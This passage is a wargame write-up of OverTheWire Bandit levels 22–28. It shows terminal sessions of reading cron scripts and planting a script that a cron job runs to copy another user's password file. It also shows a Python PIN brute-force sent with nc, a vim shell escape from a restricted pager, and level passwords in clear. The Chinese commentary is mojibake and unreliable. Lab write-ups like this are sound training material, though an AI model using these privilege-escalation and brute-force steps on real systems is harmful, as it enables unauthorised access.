/tmp/7db97df393f40ad1691b6e1fb03d53eb Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI bandit22@bandit:~$ whoami bandit22 bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3 bandit22@bandit:~$ ls -al /usr/bin/cronjob_bandit23.sh -rwxr-x--- 1 bandit23 bandit22 211 Oct 16 2018 /usr/bin/cronjob_bandit23.sh bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n bandit22@bandit:~$   ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªå‘ï¼Œå¿½ç„¶å‘ç°å¾—åˆ°çš„flagå’Œä¸Šæ¬¡ä¸€æ ·ï¼Œæ³¨æ„åˆ°è¯¥shæ˜¯bandit23æ‰€æ‰§è¡Œçš„ï¼Œå±äºbandit22ç»„ï¼Œæ‰€ä»¥ç”¨æˆ·ååº”è¯¥æ˜¯bandit23\næœ€åæŸ¥è¯¢çš„flagè¿›å…¥ä¸‹ä¸€å…³\nlevel 24 è€å¥—è·¯ï¼Œæ‰“å¼€shé˜…è¯»æºç \nè¿™æ˜¯ä¸€ä¸ªèƒ½è¿è¡Œå¹¶åˆ é™¤æŸä¸ªæ–‡ä»¶å¤¹é‡Œæ‰€æœ‰è„šæœ¬æ–‡ä»¶çš„è„šæœ¬ï¼ˆè¿™é‡Œç”¨åˆ°timeoutå»æ‰§è¡Œä»»ä½•æ–‡ä»¶\næ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±å†™ä¸€ä¸ªè„šæœ¬å»è·å–å¯†ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 @reboot bandit24 /usr/bin/cronjob_bandit24.sh \u0026\u003e /dev/null * * * * * bandit24 /usr/bin/cronjob_bandit24.sh \u0026\u003e /dev/null bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname echo \"Executing and deleting all scripts in /var/spool/$myname:\" for i in * .*; do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" timeout -s 9 60 ./$i rm -f ./$i fi done bandit23@bandit:~$ ls -al /usr/bin/cronjob_bandit24.sh -rwxr-x--- 1 bandit24 bandit23 253 Oct 16 2018 /usr/bin/cronjob_bandit24.sh bandit23@bandit:~$ ls /var/spool/bandit24 ls: cannot open directory '/var/spool/bandit24': Permission denied bandit23@bandit:~$ ls /var/spool/ bandit24 cron mail rsyslog bandit23@bandit:~$ ls /var/spool/ -al total 1348 drwxr-xr-x 5 root root 4096 Oct 16 2018 . drwxr-xr-x 11 root root 4096 Oct 16 2018 .. drwxrwx-wx 37 root bandit24 1359872 Feb 16 10:41 bandit24 drwxr-xr-x 3 root root 4096 Oct 16 2018 cron lrwxrwxrwx 1 root root 7 Oct 16 2018 mail -\u003e ../mail drwx------ 2 root root 4096 Jan 14 2018 rsyslog bandit23@bandit:~$ ls bandit23@bandit:~$ touch fuck.sh touch: cannot touch 'fuck.sh': Permission denied bandit23@bandit:~$ touch /tmp/bandit23/fuck.sh bandit23@bandit:~$ ls -al /tmp/bandit23/ total 305956 drwxrwxrwx 7 bandit23 root 4096 Feb 16 10:56 . drwxrws-wt 1 root root 313204736 Feb 16 10:57 .. -rw-r--r-- 1 bandit23 bandit23 0 Feb 16 10:56 fuck.sh -rw-r--r-- 1 bandit24 bandit24 1 Feb 14 16:05 out -rw-r--r-- 1 bandit24 bandit24 0 Feb 14 16:49 output -rw-r--r-- 1 bandit24 bandit24 66 Feb 14 20:48 pass drwxr-xr-x 3 bandit27 bandit27 4096 Feb 7 13:12 repo drwxr-xr-x 3 bandit28 bandit28 4096 Feb 7 13:21 repo28 drwxr-xr-x 4 bandit29 bandit29 4096 Feb 7 13:28 repo29 drwxr-xr-x 3 bandit30 bandit30 4096 Feb 7 13:29 repo30 drwxr-xr-x 3 bandit31 bandit31 4096 Feb 7 13:55 repo31 -rwxrwxrwx 1 bandit23 bandit23 99 Feb 15 17:49 shell.sh bandit23@bandit:~$ vim /tmp/bandit23/fuck.sh bandit23@bandit:/tmp/bandit23$ cat fuck.sh #!/bin/bash cat /etc/bandit_pass/bandit24 \u003e\u003e /tmp/bandit23/bandit23_pass bandit23@bandit:~$ chmod +x /tmp/bandit23/fuck.sh bandit23@bandit:~$ bandit23@bandit:~$ cd /tmp/bandit23 bandit23@bandit:/tmp/bandit23$ ls fuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.sh bandit23@bandit:/tmp/bandit23$ cp fuck.sh /var/spool/bandit24/fuck.sh bandit23@bandit:/tmp/bandit23$ ls fuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.sh bandit23@bandit:/tmp/bandit23$ ls fuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.sh bandit23@bandit:/tmp/bandit23$ ls fuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.sh bandit23@bandit:/tmp/bandit23$ ls bandit23_pass out pass repo28 repo30 shell.sh fuck.sh output repo repo29 repo31 bandit23@bandit:/tmp/bandit23$ cat bandit23_pass UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ bandit23@bandit:/tmp/bandit23$   level 25 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  bandit24@bandit:~$ telnet localhost 30002 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1 Timeout. Exiting. Connection closed by foreign host. bandit24@bandit:/tmp/bandit24$ nc localhost 30002 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5201 Wrong! Please enter the correct pincode. Try again. UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1213 Wrong! Please enter the correct pincode. Try again. ^C bandit24@bandit:~$ cd /tmp/bandit24 bandit24@bandit:/tmp/bandit24$ ls bandit24.sh counters.txt pass pin_mod.py pktempdir tcol bandit25.sh getpass.sh pass24.sh pin.py qsd.txt test.txt bash_file.sh mine.sh password.txt pins script.sh wesh.sh bandit24@bandit:/tmp/bandit24$ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ -bash: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ: command not found bandit24@bandit:/tmp/bandit24$ nc localhost 30002 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Fail! You did not supply enough data. Try again. UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1 ^C bandit24@bandit:/tmp/bandit24$ ls bandit24.sh fuck24.sh pass24.sh pins tcol bandit25.sh getpass.sh password.txt pktempdir test.txt bash_file.sh mine.sh pin_mod.py qsd.txt wesh.sh counters.txt pass pin.py script.sh bandit24@bandit:/tmp/bandit24$ python Python 2.7.13 (default, Sep 26 2018, 18:42:22) [GCC 6.3.0 20170516] on linux2 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. \u003e\u003e\u003e exit() bandit24@bandit:/tmp/bandit24$ touch fuck24.py bandit24@bandit:/tmp/bandit24$ vim fuck24.py bandit24@bandit:/tmp/bandit24$ touch pass24 bandit24@bandit:/tmp/bandit24$ cat fuck24.py # !/usr/bin/env python f = open('pass24','w') passwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ' for i in range(10000): flag = passwd + ' ' + str(i).zfill(4) + '\\n' f.write(flag) f.close() bandit24@bandit:/tmp/bandit24$ python fuck24.py bandit24@bandit:/tmp/bandit24$ less pass24 bandit24@bandit:/tmp/bandit24$ nc localhost 30002 \u003c pass24 \u003e ans.txt bandit24@bandit:/tmp/bandit24$ sort ans.txt | uniq -u Correct! Exiting. I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG bandit24@bandit:/tmp/bandit24$   ç®€å•æ¥è¯´ï¼Œæœ‰ä¸€ä¸ªç¨‹åºåœ¨ç›‘å¬30002ç«¯å£ï¼Œæ¥æ”¶$bandit24_pass pinï¼Œéœ€è¦æˆ‘ä»¬çˆ†ç ´pin\nè¿™è¾¹åˆ©ç”¨pythonç”Ÿæˆpass24å­—å…¸\n1 2 3 4 5 6 7 8 9  # !/usr/bin/env python f = open('pass24','w') passwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ' for i in range(10000): flag = passwd + ' ' + str(i).zfill(4) + '\\n' f.write(flag) f.close()   ç„¶åé€šè¿‡nc localhost 30002 \u003c pass24 \u003e ans.txtå‘½ä»¤å°†å…¶ä¼ ç»™å®ˆæŠ¤ç¨‹åºï¼Œè¿”å›ç»“æœå­˜å…¥ans.txt\nç„¶åå†ans.txtä¸­æ‰¾å‡ºä¸ä¸€æ ·çš„å³å¯\n//TODOï¼šåç»­æƒ³ç”¨å•çº¯çš„shellè„šæœ¬è·‘ä¸€æ³¢\nlevel26 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168  bandit25@bandit:~$ ls bandit26.sshkey bandit25@bandit:~$ ssh bandit26@localhost -i bandit26.sshkey Could not create directory '/home/bandit25/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to localhost closed. bandit25@bandit:~$bandit25@bandit:~$cat /etc/passwd rootâŒ0:0:root:/root:/bin/bash daemonâŒ1:1:daemon:/usr/sbin:/usr/sbin/nologin binâŒ2:2:bin:/bin:/usr/sbin/nologin sysâŒ3:3:sys:/dev:/usr/sbin/nologin syncâŒ4:65534:sync:/bin:/bin/sync gamesâŒ5:60:games:/usr/games:/usr/sbin/nologin manâŒ6:12:man:/var/cache/man:/usr/sbin/nologin lpâŒ7:7:lp:/var/spool/lpd:/usr/sbin/nologin mailâŒ8:8:mail:/var/mail:/usr/sbin/nologin newsâŒ9:9:news:/var/spool/news:/usr/sbin/nologin uucpâŒ10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxyâŒ13:13:proxy:/bin:/usr/sbin/nologin www-dataâŒ33:33:www-data:/var/www:/usr/sbin/nologin backupâŒ34:34:backup:/var/backups:/usr/sbin/nologin listâŒ38:38:Mailing List Manager:/var/list:/usr/sbin/nologin ircâŒ39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnatsâŒ41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobodyâŒ65534:65534:nobody:/nonexistent:/usr/sbin/nologin _aptâŒ100:65534::/nonexistent:/bin/false messagebusâŒ101:104::/var/run/dbus:/bin/false sshdâŒ102:65534::/run/sshd:/usr/sbin/nologin identdâŒ103:65534::/var/run/identd:/bin/false ntpâŒ104:107::/home/ntp:/bin/false bandit0âŒ11000:11000:bandit level 0:/home/bandit0:/bin/bash bandit1âŒ11001:11001:bandit level 1:/home/bandit1:/bin/bash bandit10âŒ11010:11010:bandit level 10:/home/bandit10:/bin/bash bandit11âŒ11011:11011:bandit level 11:/home/bandit11:/bin/bash bandit12âŒ11012:11012:bandit level 12:/home/bandit12:/bin/bash bandit13âŒ11013:11013:bandit level 13:/home/bandit13:/bin/bash bandit14âŒ11014:11014:bandit level 14:/home/bandit14:/bin/bash bandit15âŒ11015:11015:bandit level 15:/home/bandit15:/bin/bash bandit16âŒ11016:11016:bandit level 16:/home/bandit16:/bin/bash bandit17âŒ11017:11017:bandit level 17:/home/bandit17:/bin/bash bandit18âŒ11018:11018:bandit level 18:/home/bandit18:/bin/bash bandit19âŒ11019:11019:bandit level 19:/home/bandit19:/bin/bash bandit2âŒ11002:11002:bandit level 2:/home/bandit2:/bin/bash bandit20âŒ11020:11020:bandit level 20:/home/bandit20:/bin/bash bandit21âŒ11021:11021:bandit level 21:/home/bandit21:/bin/bash bandit22âŒ11022:11022:bandit level 22:/home/bandit22:/bin/bash bandit23âŒ11023:11023:bandit level 23:/home/bandit23:/bin/bash bandit24âŒ11024:11024:bandit level 24:/home/bandit24:/bin/bash bandit25âŒ11025:11025:bandit level 25:/home/bandit25:/bin/bash bandit26âŒ11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit27âŒ11027:11027:bandit level 27:/home/bandit27:/bin/bash bandit28âŒ11028:11028:bandit level 28:/home/bandit28:/bin/bash bandit29âŒ11029:11029:bandit level 29:/home/bandit29:/bin/bash bandit3âŒ11003:11003:bandit level 3:/home/bandit3:/bin/bash bandit30âŒ11030:11030:bandit level 30:/home/bandit30:/bin/bash bandit31âŒ11031:11031:bandit level 31:/home/bandit31:/bin/bash bandit32âŒ11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershell bandit33âŒ11033:11033:bandit level 33:/home/bandit33:/bin/bash bandit4âŒ11004:11004:bandit level 4:/home/bandit4:/bin/bash bandit5âŒ11005:11005:bandit level 5:/home/bandit5:/bin/bash bandit6âŒ11006:11006:bandit level 6:/home/bandit6:/bin/bash bandit7âŒ11007:11007:bandit level 7:/home/bandit7:/bin/bash bandit8âŒ11008:11008:bandit level 8:/home/bandit8:/bin/bash bandit9âŒ11009:11009:bandit level 9:/home/bandit9:/bin/bash bandit27-gitâŒ11527:11527::/home/bandit27-git:/usr/bin/git-shell bandit28-gitâŒ11528:11528::/home/bandit28-git:/usr/bin/git-shell bandit29-gitâŒ11529:11529::/home/bandit29-git:/usr/bin/git-shell bandit30-gitâŒ11530:11530::/home/bandit30-git:/usr/bin/git-shell bandit31-gitâŒ11531:11531::/home/bandit31-git:/usr/bin/git-shell   lsæœ‰ä¸€ä¸ªsshç§é’¥è¿ä¸Šå»ä¹‹åï¼Œè¿æ¥è¢«å…³é—­äº†\næ ¹æ®é¢˜ç›®æç¤ºæˆ‘ä»¬å»çœ‹/etc/passwd\n https://blog.csdn.net/yexiangCSDN/article/details/89963698\nhttps://blog.csdn.net/zyy1659949090/article/details/88176215\n/etc/passwdè¿™æ–‡ä»¶é‡Œå­˜æ”¾é‡Œç”¨æˆ·ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬æŒ‡å®šç™»å½•shell\nå¤§æ¦‚æ ¼å¼ä¸ºï¼š ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·uid:ç»„æ ‡è¯†å·gid:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:æŒ‡å®šç™»å½•shell\n çœ‹åˆ°26å…³è¿™ä¸€è¡Œæ˜¯ä¸€ä¸ªshowtext\nbandit26âŒ11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext catæŸ¥çœ‹å‘ç°æ˜¯è®¾ç½®ä¸­æ–­ç±»å‹ä¸ºlinux\n1 2 3 4 5 6 7 8  bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux more ~/text.txt exit 0 bandit25@bandit:~$    tipsï¼š\nmoreï¼Œlessï¼Œvimçš„é€€å‡ºæ¥çš„é‚£ä¸ªéƒ½æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„\n å› ä¸ºè¿™é‡Œæ˜¯moreï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠç»ˆç«¯ç¼©å°\nç„¶åæˆ‘å°±å¡ä½äº†ï¼Œå› ä¸ºæ‰§è¡Œçš„å‘½ä»¤éƒ½æ²¡æœ‰å›æ˜¾\næœ€åçœ‹åˆ«äººçš„æ”»ç•¥ï¼Œå‘ç°æ˜¯åœ¨moreçš„æ¨¡å¼ä¸‹æŒ‰vï¼Œè¿›å…¥vimæ¨¡å¼\nåœ¨vimæ¨¡å¼ä¸‹ï¼Œç”¨:e /etc/bandit_pass/bandit26å¯¼å…¥å¯†ç æ–‡ä»¶ï¼Œå¾—åˆ°å¦‚ä¸‹ä¸€è¡Œ\n5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z é•¿è§è¯†äº†é•¿è§è¯†äº†\nè¿™ç®€ç›´å°±æ˜¯ä¸ªéªšæ“ä½œ\n// åœ¨ans.txtä¸­\n level 27 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96  bl@bl-virtual-machine:~/wargame$ ssh bandit26@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit26@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to bandit.labs.overthewire.org closed.   ç”¨ä¸Šä¸€å…³çš„flagè¿›å…¥è¿™ä¸€å…³ï¼Œå‘ç°è¿æ¥åˆè¢«æ–­å¼€äº†\næ¨æµ‹æ–¹æ³•è·Ÿä¸Šä¸€å…³ä¸€æ ·ï¼Œè¿›å…¥moreæ¨¡å¼ï¼Œåˆ©ç”¨vimæ¨¡å¼æ‰§è¡Œå‘½ä»¤\nä½†æ˜¯è¿™æ¬¡å¹¶ä¸èƒ½ç”¨:eæ¥è¯»å–æ–‡ä»¶ï¼Œä¸€ié‚£ä½æƒé™ä¸å¤Ÿï¼Œ!commandä¹Ÿæ— æ³•æ‰§è¡Œ\nåæ¥æŸ¥èµ„æ–™å‘ç°vimè¿˜å¯ä»¥é€šè¿‡è®¾ç½®shellçš„ç›®å½•æ¥æ‰§è¡Œshellçš„æ–¹å¼\n1 2 3  # vimæ¨¡å¼ä¸‹ :set shell=/bin/sh :sh   è¿™æ ·å°±å¾—åˆ°äº†ä¸€ä¸ªshellï¼Œlså‘ç°æœ‰ä¸€ä¸ª./bandit27-doç¨‹åºï¼Œæ¨æµ‹å’Œä»¥å‰ä¸€æ ·ï¼Œæ˜¯è¦ç»™setuidçš„ç¨‹åºï¼Œå°è¯•ä¸€ä¸‹æœç„¶æ²¡é”™ï¼Œç›´æ¥ç”¨æ­¤è¯»å–å¯†ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123  bl@bl-virtual-machine:~/wargame$ ssh bandit26@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit26@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / !vim _ _ _ _ ___ __ | | | (_) | |__ \\ / / !v _ _ _ _ ___ __ | | | (_) | |__ \\ / / :!ls _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ :!ls _ _ _ _ ___ __ | | | (_) | |__ \\ / / :sh $ls bandit27-do text.txt $cat text.txt _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ $./bandit27-do Run a command as another user. Example: ./bandit27-do id $./bandit27-do id uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26) $./bandit27-do cat /etc/bandit_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea   level 28 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125  bl@bl-virtual-machine:~/wargame$ ssh bandit27@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | 